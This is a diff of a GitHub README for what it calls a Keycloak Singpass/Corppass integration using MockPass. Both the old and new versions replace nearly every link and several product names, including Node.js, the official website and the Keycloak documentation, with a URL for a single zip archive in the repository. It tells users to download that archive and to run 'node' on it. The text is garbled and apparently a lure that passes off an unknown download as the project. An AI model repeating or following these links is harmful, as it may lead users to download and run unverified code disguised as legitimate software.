@@ -1,17 +1,17 @@
 # 🔑 keycloak-singpass-corppass-integration - Seamless Authentication with Keycloak
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip)](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip)
+[![Download](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip)](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip)
 
 ## 🔍 Overview
-This project demonstrates https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip authentication using Keycloak. It delegates actual authentication to MockPass, simulating Singpass/Corpass. This integration simplifies login processes and enhances security for users.
+This project demonstrates https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip authentication using Keycloak. It delegates actual authentication to MockPass, simulating Singpass/Corpass. This integration simplifies login processes and enhances security for users.
 
 ## 🚀 Getting Started
 To use this application, you need to follow a few simple steps. We aimed for smooth setup to ensure an easy experience for everyone.
 
 ### 🛠️ System Requirements
 - **Operating System**: Windows, macOS, or a Linux distribution.
-- **https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip**: Version 12 or later. You can download it [here](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip).
+- **https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip**: Version 12 or later. You can download it [here](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip).
 - **Internet Access**: Required for downloading dependencies.
 
 ### 📦 Install Dependencies
@@ -24,7 +24,7 @@ npm install
 ## 📥 Download & Install
 To download the application, visit the following page:
 
-[Download the Latest Release](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip)
+[Download the Latest Release](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip)
 
 Once you reach the releases page, scroll down to find the latest version. Click on the appropriate file for your system and save it to your computer. 
 
@@ -34,7 +34,7 @@ Once you reach the releases page, scroll down to find the latest version. Click 
 3. Use the following command to start the application:
 
 ```
-node https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip
+node https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip
 ```
 
 After running the command, the application will start. Open your web browser and go to `http://localhost:3000` to access it.
@@ -42,7 +42,7 @@ After running the command, the application will start. Open your web browser and
 ### 🔑 Key Features
 - **Easy Authentication**: Leverages Keycloak for simple and secure logins.
 - **MockPass Simulation**: Mimics Singpass/Corpass for testing.
-- **https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip Based**: Built on a popular platform known for its efficiency.
+- **https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip Based**: Built on a popular platform known for its efficiency.
 
 ## 📑 Usage Instructions
 After you access the application, follow these steps:
@@ -55,7 +55,7 @@ After you access the application, follow these steps:
 If you encounter problems, here are some common issues users face along with their solutions:
 
 ### Problem: Application Won’t Start
-- **Solution**: Ensure that https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip is installed and your terminal is pointing to the correct directory.
+- **Solution**: Ensure that https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip is installed and your terminal is pointing to the correct directory.
 
 ### Problem: Login Fails
 - **Solution**: Double-check your username and password. Ensure they match the expected format.
@@ -75,8 +75,8 @@ A2: The application follows best security practices, including encrypted connect
 A3: Yes, you can modify it based on your needs since it is open-source.
 
 ## 🔗 Useful Links
-- [https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip Official Website](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip)
-- [Keycloak Documentation](https://raw.githubusercontent.com/Mirekudrone/keycloak-singpass-corppass-integration/main/fanegada/keycloak-singpass-corppass-integration.zip)
+- [https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip Official Website](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip)
+- [Keycloak Documentation](https://github.com/Mirekudrone/keycloak-singpass-corppass-integration/raw/refs/heads/main/web/nginx/mockpass/keycloak-corppass-singpass-integration-2.8.zip)
 
 ## 📞 Support
 For support, please create an issue on the GitHub repository. We are here to help you. Your feedback helps improve the application.
